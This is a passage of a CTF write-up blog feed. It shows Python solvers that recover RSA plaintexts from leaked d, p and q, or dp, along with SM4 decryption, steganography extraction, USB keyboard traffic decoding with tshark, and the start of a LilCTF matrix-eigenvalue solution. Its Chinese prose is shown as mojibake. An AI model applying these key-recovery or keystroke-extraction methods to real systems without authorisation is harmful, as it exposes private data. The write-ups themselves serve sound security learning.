class="hljs-number">121216793759965406495195349784688471172903898464863919579528667261419201175006158506254851920269184174476441342645096664857617956346276850231302641370595849992364168925183323567715165305825214477546120105756089950903529561478112787635175307546002017263761103481685637785188859785795387227441771118141108993731</span><br>n2 = <span class="hljs-number">88024091485722968131203129772830524881654529625144134588814340590011554124604316403258794718595058760192581465181932954405288276198255951037890441057834815115351239151027730304080110594116192807779817527469691548261644538550529011882499685981945213841298369305720161373509056672240371216670722254664850792423</span><br>n3 = <span class="hljs-number">161097000312435047639025857083798608426453770394810689419872061300529854423940452844900091705515387130272189159935215821125906831946941166430461267964034092194438035823677086083564924149614045494613496178826123777949284989729443312266399276493423985154752448654420778684877265358368899693320567387749119123981</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># flag1 ä¸­æ³„éœ² d</span><br>d1 = <span class="hljs-number">24601440007954283409258790415889365626604738597756305511807235656867674669709582591386480696270815244895420087866738342299329789849425948470734950224610450629270896689735724164750653504067075012851069860052288413393492140397638874689747304249627737638521072321625292497180208183282090634794285367566044496049</span><br>m1 = <span class="hljs-built_in">pow</span>(c1, d1, n1)<br>flag1 = long_to_bytes(m1)<br><br><span class="hljs-comment"># flag2 ä¸­æ³„éœ² pï¼Œq</span><br><br>p2 = <span class="hljs-number">9582848127563543144923745964600370727631625906884933335707836734329263380236258927038536326818153720067174259502906373148203118612164064303294028202007639</span><br>q2 = <span class="hljs-number">9185587657654265271925862790545538824407691820908394988893401857915219018271791875599781315096940084389655919586711021311553394520708985687587340820963057</span><br><br>phi2 = (p2-<span class="hljs-number">1</span>)*(q2-<span class="hljs-number">1</span>)<br>d2 = inverse(e, phi2)<br>m2 = <span class="hljs-built_in">pow</span>(c2, d2, n2)<br>flag2 = long_to_bytes(m2)<br><br><span class="hljs-comment"># flag3 ä¸­æ³„éœ² dpï¼Œdq</span><br>dp = <span class="hljs-number">8466156897235505876858915949875848826731809609609498324537270201005685410904242916171703973272057335477219350238441206686126349368220272071006389601023573</span><br><br>b = e*dp - <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> b % i == <span class="hljs-number">0</span>:<br>        pp = b // i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> n3 % pp == <span class="hljs-number">0</span>:<br>            p3 = pp<br>            q3 = n3 // p3<br>            <span class="hljs-keyword">break</span><br><br>phi3 = (p3 - <span class="hljs-number">1</span>) * (q3 - <span class="hljs-number">1</span>)<br>d3 = inverse(e, phi3)<br>m3 = <span class="hljs-built_in">pow</span>(c3, d3, n3)<br>flag3 = long_to_bytes(m3)<br><span class="hljs-built_in">print</span>(flag1 + flag2 + flag3)<br></code></pre></td></tr></table></figure><h2 id="ä¸‰é‡ç§˜å½±-wgb"><a href="#ä¸‰é‡ç§˜å½±-wgb" class="headerlink" title="ä¸‰é‡ç§˜å½±-wgb"></a>ä¸‰é‡ç§˜å½±-wgb</h2><p>Hintï¼šä¸€ä¸ªç¥ç§˜çš„é—´è°ç»„ç»‡ä½¿ç”¨äº†ä¸‰é‡åŠ å¯†æ¥éšè—ä»–ä»¬çš„é€šä¿¡å†…å®¹ã€‚ä½ æ‹¦æˆªåˆ°äº†ä¸€ä¸²å¥‡æ€ªå¯†ç çº¿ç´¢ï¼Œè¯·æ³¨æ„ä»–ä»¬çš„ç¥ç§˜æ ‡è®°ï¼<br>è¿˜æœ‰ä¸€æ®µå¯†æ–‡ï¼šä¾ç¨€åªå‰©ä¸‹ï¼šâ€œStone Memory Forâ€¦ï¼Ÿâ€,è¯·è§£å¼€æ­¤æ®µå¯†æ–‡ï¼Œè·å–flag</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®é¦–å…ˆç»™å‡ºäº†ä¸€ä¸ª text.txt æ–‡ä»¶ï¼ŒæŸ¥çœ‹è¿‡åå‘ç°æ˜¯ BASE64 ç¼–ç åçš„ç»“æœï¼Œå…ˆè¿›è¡Œ BASE64 çš„è§£ç ï¼Œå‘ç°å¼€å¤´å­—ç¬¦ä¸º PNG å›¾ç‰‡çš„æ•°æ®å¼€å¤´æ ¼å¼ã€‚<br><img src="/2025/09/13/%E2%80%9C%E7%BD%91%E8%B0%B7%E6%9D%AF%E2%80%9D%E5%AE%89%E5%85%A8%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B%20Writeup/file-20250913200135092.png"><br>ç›´æ¥ä¿å­˜ä¸º PNG å›¾ç‰‡ï¼Œæ‰“å¼€åå‘ç°æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ç èƒ½å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²<code>...--cfadeb-----</code>ï¼Œæ˜æ˜¾å‰åä¸¤ä¸ªæ˜¯æ‘©æ–¯å¯†ç ï¼Œå¾—åˆ°<code>3cfadeb0</code><br><img src="/2025/09/13/%E2%80%9C%E7%BD%91%E8%B0%B7%E6%9D%AF%E2%80%9D%E5%AE%89%E5%85%A8%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B%20Writeup/download%20(1).png"><br>æ¥ç€ä½¿ç”¨ 010 Editor æ‰“å¼€è¯¥å›¾ç‰‡ï¼Œå¾€ä¸‹ç¿»æ‰¾å‘ç° JPG çš„æ–‡ä»¶æ ¼å¼ï¼Œå¹¶ä¸”åœ¨æ–‡ä»¶æœ«å°¾æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²<code>d96247f2167ba262a5d8325019623b035436a8be27f807516a76c231307994b0</code><br><img src="/2025/09/13/%E2%80%9C%E7%BD%91%E8%B0%B7%E6%9D%AF%E2%80%9D%E5%AE%89%E5%85%A8%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B%20Writeup/file-20250913200432369.png"><br>å†å°† JPG æ–‡ä»¶ä¿å­˜ä¹‹åï¼Œå¾—åˆ°ä¸€ä¸²æ‘©æ–¯å¯†ç <br><img src="/2025/09/13/%E2%80%9C%E7%BD%91%E8%B0%B7%E6%9D%AF%E2%80%9D%E5%AE%89%E5%85%A8%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B%20Writeup/1.jpg"><br>è§£å¯†åå¾—åˆ°<code>9273016854</code>ï¼Œç»“åˆå‰è¾¹çš„ä¸¤ç«¯ä¹Ÿæ˜¯æ‘©æ–¯å¯†ç ï¼Œä¸”åˆšå¥½åœ¨ä¸‹è¾¹è¿™ä¸ªå›¾ç‰‡ä¸­ç›¸é‚»ï¼Œå› æ­¤çŒœæµ‹ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²åº”è¯¥æ’åœ¨ç¬¬äºŒä¸ªå­—ç¬¦ä¸²ä¸­é—´ï¼Œå¾—åˆ°<code>9273cfadeb016854</code><br>è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸€é•¿ä¸€çŸ­ï¼Œå¾ˆå®¹æ˜“æŠŠå®ƒä»¬å½“ä½œä¸€ä¸ªå¯†æ–‡ä¸€ä¸ªå¯†é’¥ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŠ å¯†ã€‚æœ€åç»“åˆé¢˜ç›®æ‰€è¯´<code>Stone Memory For...ï¼Ÿ</code>ï¼ŒçŒœæµ‹åŠ å¯†ç®—æ³•ä¸º SM4ï¼Œ<code>9273cfadeb016854</code>ä¹Ÿåˆšå¥½ 16 ä¸ªå­—èŠ‚ï¼Œç›´æ¥ ECB æ¨¡å¼è§£å¯†ä¾¿å¾—åˆ° flag</p><h3 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmssl.sm4 <span class="hljs-keyword">import</span> CryptSM4, SM4_DECRYPT<br><br>c = <span class="hljs-string">&quot;d96247f2167ba262a5d8325019623b035436a8be27f807516a76c231307994b0&quot;</span><br>key = <span class="hljs-string">b&quot;9273cfadeb016854&quot;</span><br>c_bytes = <span class="hljs-built_in">bytes</span>.fromhex(c)<br><br>sm4 = CryptSM4()<br>sm4.set_key(key, SM4_DECRYPT)<br><br>flag = sm4.crypt_ecb(c_bytes)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Format-8bit-wgb"><a href="#Format-8bit-wgb" class="headerlink" title="Format-8bit-wgb"></a>Format-8bit-wgb</h2><p>Hintï¼šçœ‹ä¸æ‡‚çš„æ±‰å­—éšè—äº†ä»€ä¹ˆç§˜å¯†å‘¢ï¼Ÿ</p><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®ç»™äº†ä¸€ä¸ª JPG æ–‡ä»¶ï¼Œ010 Editor æ‰“å¼€æŸ¥çœ‹åå…­è¿›åˆ¶æ•°æ®ï¼Œå‘ç°æ–‡ä»¶ç»“å°¾å­˜åœ¨ç€ä¸€ä¸ª Zip å‹ç¼©åŒ…ï¼Œå¯ä»¥ä½¿ç”¨ Binwalk ç›´æ¥åˆ†ç¦»</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="hljs-section">--------------------------------------------------------------------------------</span><br>351661        0x55DAD         Zip archive data, at least v2.0 to extract, compressed size: 154, uncompressed size: 165, name: 422.txt<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ª 422.txt æ–‡ä»¶ï¼ŒæŸ¥çœ‹å‘ç°æ–‡ä»¶å†…å¥½åƒæ˜¯éå¸¸å¤æ‚çš„æ±‰å­—è¿˜æœ‰ä¸€äº›ä¹±ç ï¼ŒçŒœæµ‹æ˜¯<code>utf-16</code>ç¼–ç çš„å­—ç¬¦ï¼Œå°è¯•è¿‡åå‘ç°æ˜¯å¤§ç«¯åº <code>utf-16be</code>ï¼Œå°†å…¶è½¬æ¢ä¸ºå­—èŠ‚æµï¼Œç„¶åå†ä½¿ç”¨<code>gbk</code>è§£ç ä¾¿èƒ½å¾—åˆ°flag</p><h3 id="è„šæœ¬-2"><a href="#è„šæœ¬-2" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">txt = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;422.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>).read()<br><br>utf16be_bytes = <span class="hljs-string">b&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(ch)).encode(<span class="hljs-string">&#x27;utf-16be&#x27;</span>) <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> txt)<br>flag = utf16be_bytes.decode(<span class="hljs-string">&#x27;gbk&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="non-interlaced-wgb"><a href="#non-interlaced-wgb" class="headerlink" title="non-interlaced-wgb"></a>non-interlaced-wgb</h2><p>Hintï¼šç¥å¥‡çš„å›¾ç‰‡æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿ</p><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ç›®ç»™å‡ºäº† 9 å¼ ä¸åŒé¢œè‰²çš„åƒç´ å›¾ç‰‡ï¼Œåˆ†åˆ«ä¸º 3 å¼ çº¢è‰²ï¼Œ3 å¼ ç»¿è‰²ï¼Œ3 å¼ è“è‰²ï¼Œå› æ­¤çŒœæµ‹å’Œåƒç´ çš„ RGB å€¼æœ‰å…³ï¼Œå°†å›¾ç‰‡æ”¾å…¥ Stegsolve è¿›è¡Œåˆ†æã€‚<br>ä»¥ <code>å›¾ç‰‡ 1</code> ä¸ºä¾‹ï¼Œå‘ç°åœ¨ Red çš„æ¯ä¸ªé€šé“ä¸Šéƒ½å­˜åœ¨å¾ˆå¤šæ•°æ®<br><img src="/2025/09/13/%E2%80%9C%E7%BD%91%E8%B0%B7%E6%9D%AF%E2%80%9D%E5%AE%89%E5%85%A8%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B%20Writeup/file-20250913203512984.png"><br>ç„¶åä½¿ç”¨ Data Extract å¯¹é€šé“ä¸Šçš„æ•°æ®è¿›è¡Œåˆ†æï¼Œå‹¾é€‰ Red çš„æ‰€æœ‰é€šé“ï¼ŒæŸ¥çœ‹åå…­è¿›åˆ¶æ•°æ®ï¼Œå‘ç°æ˜¯ Zip çš„æ•°æ®ï¼Œä½†æ˜¯å¹¶ä¸å®Œæ•´ï¼Œå› æ­¤çŒœæµ‹åè¾¹çš„æ¯ä¸ªå›¾ç‰‡æ˜¯å¦éƒ½å¸¦æœ‰ä¸€éƒ¨åˆ†æ•°æ®<br><img src="/2025/09/13/%E2%80%9C%E7%BD%91%E8%B0%B7%E6%9D%AF%E2%80%9D%E5%AE%89%E5%85%A8%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B%20Writeup/file-20250913203633374.png"><br>ä¸ºäº†éªŒè¯çŒœæµ‹ï¼Œç›´æ¥æŸ¥çœ‹ <code>å›¾ç‰‡9</code> æ˜¯å¦å«æœ‰ Zip çš„æ–‡ä»¶ç»“å°¾<br><img src="/2025/09/13/%E2%80%9C%E7%BD%91%E8%B0%B7%E6%9D%AF%E2%80%9D%E5%AE%89%E5%85%A8%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B%20Writeup/file-20250913203830386.png"><br>æŸ¥çœ‹ä¹‹åï¼Œè¯´æ˜ç¡®å®å¦‚æˆ‘ä»¬æ‰€å‡è®¾çš„é‚£æ ·ï¼Œå› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥å°†æ¯ä¸ªå›¾ç‰‡ä¸­éšå†™çš„æ•°æ®éƒ½æå–å‡ºæ¥ï¼Œæ‹¼æ¥åœ¨ä¸€èµ·ä¾¿å¯ä»¥å¾—åˆ°ä¸€ä¸ª Zip å‹ç¼©åŒ…ï¼Œè§£å‹ä¹‹åå¾—åˆ° flag.jpg<br><img src="/2025/09/13/%E2%80%9C%E7%BD%91%E8%B0%B7%E6%9D%AF%E2%80%9D%E5%AE%89%E5%85%A8%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B%20Writeup/flag.jpg"></p><h1 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h1><h2 id="Spyware-wgb"><a href="#Spyware-wgb" class="headerlink" title="Spyware-wgb"></a>Spyware-wgb</h2><p>Hintï¼šæƒ…å†µç´§æ€¥ï¼Œå°Aä½¿ç”¨äº†ç»å¦™çš„éšè—æ–¹æ³•ä¼ è¾“äº†å¯†ç ä¿¡æ¯ã€‚</p><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é™„ä»¶ä¸­ç»™å‡ºäº†ä¸€ä¸ª 1.pcapng çš„æµé‡æ•°æ®åŒ…ï¼Œä½¿ç”¨ Wireshark æ‰“å¼€æŸ¥çœ‹å‘ç°æ˜¯ USB æµé‡ï¼ŒçŒœæµ‹æ˜¯å¦ä¼šæ˜¯é¼ æ ‡æµé‡æˆ–è€…é”®ç›˜æµé‡ã€‚<br><img src="/2025/09/13/%E2%80%9C%E7%BD%91%E8%B0%B7%E6%9D%AF%E2%80%9D%E5%AE%89%E5%85%A8%E6%9E%81%E5%AE%A2%E5%A4%A7%E8%B5%9B%20Writeup/file-20250913204136629.png"><br>ä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰å‘ç° usbhidï¼Œåªå‘ç°äº†è®¸å¤š Leftover Capture Data ï¼Œæœç´¢ä¹‹åå‘ç°æ˜¯æ²¡æœ‰è¢«è®¤å‡ºçš„æŠ¥æ–‡æ•°æ®ï¼Œå› æ­¤å®ƒä»¬æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡éœ€è¦ä½¿ç”¨<code>capdata</code>å°†æ•°æ®è¿‡æ»¤å‡ºï¼Œç„¶åä½¿ç”¨ tshark æå–å³å¯ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tshark</span> -r <span class="hljs-number">1</span>.pcapng -T fields -e usb.capdata &gt; <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p>è§‚å¯Ÿæå–å‡ºçš„æ•°æ®ï¼Œå‘ç°å…¶æ•°æ®çš„å˜æ¢å¹¶ä¸è¿ç»­ï¼Œå› æ­¤çŒœæµ‹ä¸æ˜¯é¼ æ ‡æµé‡ï¼Œè€Œæ˜¯é”®ç›˜æµé‡ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>hid = &#123;<br>    <span class="hljs-number">0x04</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">0x05</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">0x06</span>: <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">0x07</span>: <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-number">0x08</span>: <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-number">0x09</span>: <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-number">0x0A</span>: <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-number">0x0B</span>: <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-number">0x0C</span>: <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">0x0D</span>: <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-number">0x0E</span>: <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-number">0x0F</span>: <span class="hljs-string">&#x27;l&#x27;</span>,<br>    <span class="hljs-number">0x10</span>: <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-number">0x11</span>: <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-number">0x12</span>: <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-number">0x13</span>: <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-number">0x14</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-number">0x15</span>: <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-number">0x16</span>: <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-number">0x17</span>: <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-number">0x18</span>: <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-number">0x19</span>: <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-number">0x1A</span>: <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-number">0x1B</span>: <span class="hljs-string">&#x27;x&#x27;</span>,<br>    <span class="hljs-number">0x1C</span>: <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-number">0x1D</span>: <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-number">0x1E</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-number">0x1F</span>: <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-number">0x20</span>: <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-number">0x21</span>: <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-number">0x22</span>: <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-number">0x23</span>: <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-number">0x24</span>: <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-number">0x25</span>: <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-number">0x26</span>: <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-number">0x27</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-number">0x28</span>: <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-number">0x2C</span>: <span class="hljs-string">&#x27; &#x27;</span> <br>&#125;<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&quot;2000&quot;</span>):<br>            key_code = line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>]<br>            <span class="hljs-keyword">if</span> key_code:<br>                key = <span class="hljs-built_in">int</span>(key_code, <span class="hljs-number">16</span>)<br>                <span class="hljs-keyword">if</span> key <span class="hljs-keyword">in</span> hid:<br>                    flag += hid[key]<br>                <br><span class="hljs-built_in">print</span>(flag)<br>flag =flag.replace(<span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>).replace(<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(flag,<span class="hljs-number">2</span>))) <br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LilCTF 2025 Writeupï¼ˆå¤ç°ï¼‰</title>
    <link href="/2025/08/31/LilCTF%202025%20Writeup%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/"/>
    <url>/2025/08/31/LilCTF%202025%20Writeup%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>å½“æ—¶è·Ÿ sekai CTF æ—¶é—´æœ‰ç‚¹è¿‘ï¼Œæ‰€ä»¥æ²¡æ‰“ï¼Œè¿™å‡ å¤©æ²¡ä»€ä¹ˆäº‹åšä¸€ä¸‹é¢˜çœ‹çœ‹ï¼ˆç»å¯¹ä¸æ˜¯è¢« sekai CTF é­æ‰“äº†å›æ¥æ‰¾æ‰¾è‡ªä¿¡Ù©(Åï¹Åã€)Û¶ </p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ez-math"><a href="#ez-math" class="headerlink" title="ez_math"></a>ez_math</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;LILCTF&#123;test_flag&#125;&#x27;</span>[<span class="hljs-number">7</span>:-<span class="hljs-number">1</span>]<br>lambda1 = bytes_to_long(flag[:<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>])<br>lambda2 = bytes_to_long(flag[<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>:])<br>p = getPrime(<span class="hljs-number">512</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">vector, c</span>):<br>    <span class="hljs-keyword">return</span> [vector[<span class="hljs-number">0</span>]*c, vector[<span class="hljs-number">1</span>]*c]<br><br>v1 = [getPrime(<span class="hljs-number">128</span>), getPrime(<span class="hljs-number">128</span>)]<br>v2 = [getPrime(<span class="hljs-number">128</span>), getPrime(<span class="hljs-number">128</span>)]<br><br>A = matrix(GF(p), [v1, v2])<br>B = matrix(GF(p), [mul(v1,lambda1), mul(v2,lambda2)])<br>C = A.inverse() * B<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;C = <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(C).replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;,&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>).replace(<span class="hljs-string">&quot;[,&quot;</span>, <span class="hljs-string">&quot;[&quot;</span>)&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># p = 9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161</span><br><span class="hljs-comment"># C = [7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645,7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801],[7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808,2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872]</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>æˆ‘ä»¬å·²çŸ¥ A å‘é‡ï¼Œä¸ºäº†åç»­æ–¹ä¾¿è¿ç®—ï¼Œæˆ‘ä»¬å†™æˆåˆ—å‘é‡çš„å½¢å¼ï¼š<br>$$<br>A &#x3D;<br>\begin{bmatrix}<br>v_1 \newline<br>v_2<br>\end{bmatrix}<br>$$<br>æˆ‘ä»¬æ ¹æ® B çš„ç”Ÿæˆæ–¹å¼ï¼Œå¯ä»¥å°†å…¶è¿›è¡Œåˆ†è§£æˆä¸¤ä¸ªçŸ©é˜µç›¸ä¹˜çš„å½¢å¼ï¼š<br><span><br>$$<br>B &#x3D;<br>\begin{bmatrix}<br>v_1\lambda_1 \newline<br>v_2\lambda_2<br>\end{bmatrix}<br>&#x3D;<br>\begin{bmatrix}<br>\lambda_1 &amp; 0 \newline<br>0 &amp; \lambda_2<br>\end{bmatrix}<br>\begin{bmatrix}<br>v_1 \newline<br>v_2<br>\end{bmatrix}<br>&#x3D;<br>\begin{bmatrix}<br>\lambda_1 &amp; 0 \newline<br>0 &amp; \lambda_2<br>\end{bmatrix}<br>A<br>$$<br></span></p><p>ç„¶åå†è§‚å¯Ÿç”Ÿæˆçš„ Cï¼Œå¯ä»¥å‘ç°è²Œä¼¼æ‰¾åˆ°äº†æ€è·¯ï¼š<br>$$<br>C &#x3D; A^{-1}B&#x3D;A^{-1}<br>\begin{bmatrix}<br>\lambda_1 &amp; 0 \newline<br>0 &amp; \lambda_2<br>\end{bmatrix}<br>A<br>$$<br>æˆ‘ä»¬è®¾<br>$$<br>D&#x3D;<br>\begin{bmatrix}<br>\lambda_1 &amp; 0 \newline<br>0 &amp; \lambda_2<br>\end{bmatrix}<br>$$<br>ä¸Šè¿°çš„åˆ†æè¯´æ˜ï¼ŒC å’Œ D çŸ©é˜µç›¸ä¼¼ï¼Œç”±ç›¸ä¼¼çŸ©é˜µçš„ç‰¹æ€§å¯çŸ¥å…¶ç‰¹å¾å€¼ä¸€æ ·ï¼Œè€Œ D çš„ç‰¹å¾å€¼å¾ˆå®¹æ˜“å¾—åˆ°ä¸º $\lambda_1,\lambda_2$ï¼Œé‚£ä¹ˆè¯´æ˜ C çš„ç‰¹å¾å€¼ä¹Ÿæ˜¯ 